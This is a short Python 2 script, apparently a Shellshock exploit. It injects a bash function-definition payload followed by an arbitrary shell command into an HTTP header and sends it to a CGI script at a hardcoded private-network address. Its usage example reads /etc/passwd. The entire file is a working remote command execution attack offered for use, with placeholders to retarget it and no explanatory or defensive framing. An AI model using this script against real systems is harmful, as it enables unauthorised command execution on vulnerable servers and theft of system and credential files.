#!/usr/bin/env python


import sys
import urllib
import httplib

def usage():
	print "Usage: %s <command>" % sys.argv[0]
	print "Example: %s \"/bin/cat /etc/passwd\""
	exit()

def build_useragent(command):
	ua = "() { test;};echo \"content-type: text/plain\"; echo; echo; " + command
	print ua
	headers = {"test": ua}

	return headers


def send_request(ip, port, uri, headers):
	conn = httplib.HTTPConnection(ip, port)	
	conn.request("GET", uri, headers = headers)

	res = conn.getresponse()

	print res.status, res.reason

	data = res.read()
	print data

	conn.close()

if __name__ == '__main__':
	if (len(sys.argv) != 2):
		usage()
	
	ip_address = "192.168.56.103"   #change this
	port = "591"					#change this
	uri = "/cgi-bin/cat"			#change this

	headers = build_useragent(sys.argv[1])
	send_request(ip_address, port, uri, headers)


	